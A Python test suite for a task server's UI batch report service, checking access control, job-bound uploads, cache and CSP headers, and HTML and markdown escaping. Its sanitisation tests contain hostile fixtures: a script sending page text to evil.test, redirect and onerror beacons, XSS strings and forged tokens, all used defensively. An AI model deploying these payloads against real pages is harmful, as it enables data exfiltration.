import pytest
from test_ui_batch_dispatch import dispatch_env
from test_ui_execution_service import environment, ACTORS, APP
from test_ui_batch_report_service import completed
from task_server.services.operation_attribution import actor_context


def test_report_and_artifacts_require_owner_and_current_app(dispatch_env,monkeypatch):
    from task_server.services import ui_batch_report_service as reports
    from task_server import identity
    batch,job,event = completed()
    artifact = reports.save_ui_artifact(job['job_id'],event,b'private','html')
    with actor_context(ACTORS['a']):
        reports.build_ui_batch_report(None,batch['ui_batch_id'])
    for name in ('b','a'):
        if name == 'a':
            original=identity.get_access_profile
            monkeypatch.setattr(identity,'get_access_profile',lambda n:{**original(n),'scope':{'ui_apps':[]}})
        with actor_context(ACTORS[name]):
            for fn in (
                lambda: reports.get_ui_batch_report(None,batch['ui_batch_id']),
                lambda: reports.download_ui_batch_report(None,batch['ui_batch_id'],'html'),
                lambda: reports.download_ui_batch_report(None,batch['ui_batch_id'],'docx'),
                lambda: reports.get_ui_batch_summary(None,batch['ui_batch_id']),
                lambda: reports.read_ui_artifact(None,batch['ui_batch_id'],artifact['artifact_id']),
            ):
                with pytest.raises((PermissionError,FileNotFoundError)): fn()


def test_artifact_upload_requires_job_bound_claim(dispatch_env):
    from task_server.services import ui_batch_report_service as reports
    batch,job,event=completed()
    for invalid in ({},{**event,'ui_claim_token':'forged'},{**event,'device_id':'other'},{**event,'runner_id':'other'}):
        with pytest.raises(PermissionError): reports.save_ui_artifact(job['job_id'],invalid,b'secret','html')


def test_legacy_jobs_never_expose_batch_results_even_to_all_apps_or_admin(dispatch_env):
    from task_server.access_control import MainAccess, AccessDenied
    batch,job,event=completed()
    for admin in (False,True):
        policy=MainAccess({'is_superuser':admin,'permissions':['ui.view'],'scope':{'ui_apps':'*'}},catalog=[])
        result=policy.filter('/api/jobs',{'jobs':[job,{'job_id':'legacy','stdout_tail':'public history'}],'total':2})
        assert [r['job_id'] for r in result['jobs']] == ['legacy']
        with pytest.raises(AccessDenied): policy.check('GET','/api/jobs/'+job['job_id'])


class Handler:
    def __init__(self, body=None, headers=None, raw=b'private report'):
        self.body=body or {}; self.headers=headers or {}; self.raw=raw; self.response=None
    def _body(self): return self.body
    def _json(self,body,status=200): self.response=(body,status)
    def _text(self,body,status=200): self.response=(body,status)
    def _stream_body_to_file(self,path):
        from pathlib import Path
        Path(path).write_bytes(self.raw)


def test_direct_and_chunk_upload_are_private_and_job_bound(dispatch_env,monkeypatch,tmp_path):
    import base64
    from task_server import router
    from task_server.services import ui_batch_report_service as reports
    batch,job,event=completed()
    public=tmp_path/'public'
    monkeypatch.setattr(router,'REPORT_DIR',str(public))
    monkeypatch.setattr(router,'_require_runner_auth',lambda _:False)
    headers={'x-token':router.TOKEN,'x-filename':'same.html','x-ui-job-id':job['job_id'],
             'x-ui-claim-token':event['ui_claim_token'],'x-ui-runner-id':'mac','x-ui-device-id':'iphone'}
    h=Handler(headers=headers)
    router._post_report(h,{})
    assert h.response[1] == 200 and h.response[0].startswith('/api/ui-executions/')
    assert not public.exists()
    metadata={**event,'job_id':job['job_id']}
    for index,content in enumerate((b'chunk one',b'chunk two')):
        h=Handler({**metadata,'filename':'same.html','upload_id':'upload','index':index,'total':2,
                   'contentBase64':base64.b64encode(content).decode()})
        router._post_report_chunk(h,{})
        assert h.response[1] == 200
    h=Handler({**metadata,'upload_id':'upload','total':2})
    router._post_report_chunk_finish(h,{})
    assert h.response[1] == 200 and h.response[0]['url'].startswith('/api/ui-executions/')
    assert not public.exists()
    with actor_context(ACTORS['a']):
        artifact_id=h.response[0]['url'].split('/')[-1]
        assert b'chunk onechunk two' in reports.read_ui_artifact(None,batch['ui_batch_id'],artifact_id)[0]
    h=Handler(headers={**headers,'x-ui-claim-token':'forged'})
    router._post_report(h,{})
    assert h.response[1] == 403


def test_unbound_new_batch_filenames_fail_closed(dispatch_env,monkeypatch,tmp_path):
    from task_server import router
    batch,job,event=completed()
    public=tmp_path/'public'
    monkeypatch.setattr(router,'REPORT_DIR',str(public))
    h=Handler(headers={'x-token':router.TOKEN,'x-filename':'same-'+job['job_id']+'.html'})
    router._post_report(h,{})
    assert h.response[1] == 403 and not public.exists()


def test_inline_result_and_forged_urls_do_not_escape_private_storage(dispatch_env,monkeypatch,tmp_path):
    import base64
    from task_server import router
    from task_server.services import ui_batch_report_service as reports, ui_batch_dispatch as dispatch, job_service
    from task_server.services.ui_execution_store import UiExecutionStore
    batch,job,event=completed()
    dispatch.record_ui_attempt_event(job['job_id'],2,{**event,'type':'report_ready',
        'report_url':'https://evil.example/private','report_html':'<script>private()</script>',
        'screenshots':[{'name':'shot.png','contentBase64':base64.b64encode(b'\x89PNG\r\n\x1a\nprivate').decode()}]})
    stored=UiExecutionStore().get_batch(batch['ui_batch_id'])
    assert 'evil.example' not in str(stored)
    assert not job_service.get_job(job['job_id']).get('stdout_tail')
    with actor_context(ACTORS['a']):
        snapshot=reports.build_ui_batch_report(None,batch['ui_batch_id'])['snapshot']
        assert len(snapshot['artifacts']) == 2
        for artifact in snapshot['artifacts']:
            assert reports.read_ui_artifact(None,batch['ui_batch_id'],artifact['artifact_id'])[0]


def test_report_http_download_headers_and_cross_user(dispatch_env):
    import re
    from task_server import router
    from task_server.services import ui_batch_report_service as reports
    batch,job,event=completed()
    class Download(Handler):
        def __init__(self):
            import io
            super().__init__(); self.sent={}; self.wfile=io.BytesIO()
        def send_response(self,status): self.status=status
        def send_header(self,key,value): self.sent[key]=value
        def end_headers(self): pass
    match=re.fullmatch(r'(uib_[0-9a-f]{32})',batch['ui_batch_id'])
    with actor_context(ACTORS['a']):
        reports.build_ui_batch_report(None,batch['ui_batch_id'])
        h=Download()
        router._get_ui_batch_report_download(h,{'format':'docx'},match)
        assert h.status == 200 and h.wfile.getvalue().startswith(b'PK')
        assert "filename*=UTF-8''" in h.sent['Content-Disposition']
        assert h.sent['Cache-Control'] == 'private, no-store'
        assert 'sandbox' in h.sent['Content-Security-Policy']
    with actor_context(ACTORS['b']):
        h=Download()
        router._get_ui_batch_report_download(h,{'format':'html'},match)
        assert h.response[1] == 404


@pytest.mark.parametrize(('kind', 'mime', 'label'), [
    ('jpg', 'image/jpeg', '执行截图'),
    ('png', 'image/png', '执行截图'),
    ('html', 'text/html; charset=utf-8', '原始报告静态内容'),
])
def test_artifact_download_keeps_type_and_uses_readable_filename(dispatch_env, kind, mime, label):
    import io
    import re
    from urllib.parse import unquote
    from task_server import router
    from task_server.services import ui_batch_report_service as reports
    batch, job, event = completed()
    raw = {'jpg': b'\xff\xd8\xff\xe0image bytes\xff\xd9',
           'png': b'\x89PNG\r\n\x1a\nimage bytes',
           'html': b'<p>private evidence</p><script>alert(1)</script>'}[kind]
    artifact = reports.save_ui_artifact(job['job_id'], event, raw, kind)

    class Download(Handler):
        def __init__(self):
            super().__init__(); self.sent = {}; self.wfile = io.BytesIO()
        def send_response(self, status): self.status = status
        def send_header(self, key, value): self.sent[key] = value
        def end_headers(self): pass

    match = re.fullmatch(r'(uib_[0-9a-f]{32})/([0-9a-f]{64})',
                         batch['ui_batch_id'] + '/' + artifact['artifact_id'])
    with actor_context(ACTORS['a']):
        h = Download()
        router._get_ui_batch_artifact(h, {}, match)
        expected_name = f"{label}-{artifact['artifact_id'][:12]}.{kind}"
        assert h.status == 200
        assert unquote(h.sent['Content-Disposition'].split("filename*=UTF-8''", 1)[1]) == expected_name
        assert h.sent['Content-Type'] == mime
        assert h.sent['Cache-Control'] == 'private, no-store'
        assert h.sent['X-Content-Type-Options'] == 'nosniff'
        assert 'sandbox' in h.sent['Content-Security-Policy']
        if kind == 'html':
            assert b'private evidence' in h.wfile.getvalue() and b'<script' not in h.wfile.getvalue()
        else:
            assert h.wfile.getvalue() == raw
        assert artifact['url'].endswith('/' + artifact['artifact_id'])
    with actor_context(ACTORS['b']):
        h = Download()
        router._get_ui_batch_artifact(h, {}, match)
        assert h.response[1] == 404 and not h.wfile.getvalue()


def test_markdown_and_html_escape_untrusted_case_labels(dispatch_env):
    from task_server.services import ui_batch_report_service as reports
    batch,job,event=completed()
    db=reports._connect()
    try:
        import json
        db.execute('UPDATE snapshots SET metadata_json=? WHERE ui_batch_id=?',
          (json.dumps({'task_name':'<script>alert(1)</script>\n[secret](https://evil.test) | forged','app_name':'报告测试报告'}),batch['ui_batch_id']))
    finally: db.close()
    with actor_context(ACTORS['a']):
        reports.build_ui_batch_report(None,batch['ui_batch_id'])
        md=reports.download_ui_batch_report(None,batch['ui_batch_id'],'md')[0].decode()
        html=reports.download_ui_batch_report(None,batch['ui_batch_id'],'html')[0].decode()
        assert '<script>' not in md and '[secret](' not in md
        assert '<script>' not in html and '<a href="https://evil.test' not in html


def test_sonic_legacy_callbacks_cannot_publish_ui_batch_results(dispatch_env,monkeypatch,tmp_path):
    from task_server import router
    from task_server.services import job_service
    batch,job,event=completed()
    public=tmp_path/'public'
    monkeypatch.setattr(router,'_require_user_auth',lambda _:False)
    monkeypatch.setattr(router,'LEARNING_DIR',str(public))
    monkeypatch.setattr(router,'attach_sonic_background_report',lambda *a:pytest.fail('legacy report writer called'))
    for function in (router._post_sonic_result,router._post_sonic_report_ready):
        h=Handler({**event,'job_id':job['job_id'],'module':'shared','file':'same.yaml',
                   'ui_event_sequence':2,'report_url':'https://evil.example/report'})
        function(h,{})
        assert h.response[1] == 200
        assert not public.exists()
        assert not job_service.get_job(job['job_id']).get('report_url')


def test_html_blob_has_embedded_policy_and_inert_raw_content(dispatch_env):
    from task_server.services import ui_batch_report_service as reports
    batch,job,event=completed()
    raw=b'<html><head><meta http-equiv="refresh" content="0;url=https://evil.test"><base href="https://evil.test"></head><body><script>location="https://evil.test/?"+document.body.textContent</script><a href="https://evil.test">private evidence</a><img src="https://evil.test/pixel" onerror="alert(1)"></body></html>'
    artifact=reports.save_ui_artifact(job['job_id'],event,raw,'html')
    with actor_context(ACTORS['a']):
        rendered=reports.read_ui_artifact(None,batch['ui_batch_id'],artifact['artifact_id'])[0].decode()
        assert 'Content-Security-Policy' in rendered and "script-src 'none'" in rendered
        assert '<script' not in rendered and 'https://evil.test' not in rendered
        assert 'onerror' not in rendered and 'http-equiv="refresh"' not in rendered
        reports.build_ui_batch_report(None,batch['ui_batch_id'])
        export=reports.download_ui_batch_report(None,batch['ui_batch_id'],'html')[0].decode()
        assert 'Content-Security-Policy' in export and "script-src 'none'" in export


def test_json_batch_responses_are_not_cacheable():
    import io
    from task_server.response import ResponseMixin
    class JsonResponse(ResponseMixin):
        def __init__(self): self.headers={}; self.sent={}; self.wfile=io.BytesIO(); self._access_path='/api/ui-executions/uib_123/report'
        def send_response(self,status): pass
        def send_header(self,key,value): self.sent[key]=value
        def end_headers(self): pass
    handler=JsonResponse(); handler._json({'snapshot':'private'})
    assert handler.sent['Cache-Control'] == 'private, no-store'


def test_legacy_queue_does_not_persist_raw_step_payload(dispatch_env):
    from task_server.services import ui_batch_dispatch as dispatch, job_service
    batch,job,event=completed()
    stored=job_service.get_job(job['job_id'])
    assert stored.get('execution_progress') in (None,{})


def test_abandoned_private_chunks_are_reclaimed_on_retry_and_bounded_expiry(dispatch_env):
    import base64,time
    from task_server.services import ui_batch_report_service as reports
    from task_server.services.ui_batch_report_upload import handle_chunk_upload
    batch,job,event=completed()
    metadata={**event,'job_id':job['job_id'],'index':0,'total':2,'contentBase64':base64.b64encode(b'chunk').decode()}
    for upload_id in ('abandoned','retry'):
        h=Handler(); handle_chunk_upload(h,{**metadata,'upload_id':upload_id})
        assert h.response[1] == 200
    db=reports._connect()
    try:
        assert [row[0] for row in db.execute('SELECT DISTINCT upload_id FROM ui_report_chunks')] == ['retry']
        db.execute('UPDATE ui_report_chunks SET created_ns=0')
    finally: db.close()
    reports.cleanup_ui_report_chunks(limit=1)
    db=reports._connect()
    try: assert db.execute('SELECT COUNT(*) FROM ui_report_chunks').fetchone()[0] == 0
    finally: db.close()
